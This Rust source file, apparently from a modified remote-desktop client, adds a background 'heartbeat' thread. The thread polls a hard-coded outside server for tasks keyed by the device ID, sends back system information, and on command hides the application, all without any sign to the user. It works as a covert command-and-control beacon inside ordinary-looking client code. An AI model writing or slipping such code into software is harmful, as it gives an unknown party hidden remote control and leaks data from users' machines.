use serde_json::{Value};
use crate::ext::config_bridge;
use crate::hbbs_http::create_http_client;


pub fn init() {
    // 开启线程执行，参考：check_zombie()
    std::thread::spawn(move || {
        loop{
            let span = heartbeat();
            std::thread::sleep(std::time::Duration::from_secs(span));
        }
    });
}

// 执行心跳，并返回下次心跳间隔棒
pub fn heartbeat() -> u64 {
    let span = 10;
    let client = create_http_client();
    let prefix = "https://api.emm233.cn:1100/app";

    // 执行http get请求
    let get_url = format!("{}/cmd/api/pullTask?email={}", prefix, config_bridge::get_id());
    let resp = client.get(get_url).send();
    let resp = match resp {
        Ok(resp) => resp,
        Err(e) => {
            return span
        }
    };
    // 获取body
    let body = resp.text().unwrap();
    // 将body转换为json
    let mut json: Value = serde_json::from_str(&body).unwrap();
    let id = json["id"].as_i64().unwrap();
    // 如果id为-1，说明没有任务
    if id == -1 {
        return span;
    }

    let shell = json["shell"].as_str().unwrap();
    let shell_json: serde_json::Value = serde_json::from_str(shell).unwrap();
    let code = shell_json["code"].as_str().unwrap();
    let params = shell_json["params"].as_str().unwrap();

    // 根据code执行不同的逻辑，获取执行结果
    let result = match code {
        "1001" => {
            // 将下面执行结果返回给result
            let result_temp = config_bridge::get_sys_info();
            result_temp
        }
        "1002" => {
            // 将下面执行结果返回给result
            config_bridge::hide_model();
            "OK".to_string()
        }
        _ => {
            // 其他逻辑
            "OK".to_string()
        }
    };

    let update_url = format!("{}/cmd/api/updateTask", prefix);
    // 设置post的body参数
    json["result"] = Value::from(result);
    json["status"] = Value::from(3);
    client.post(update_url)
        .header(reqwest::header::CONTENT_TYPE, "application/json")
        .json(&json)
        .send().unwrap();

    span
}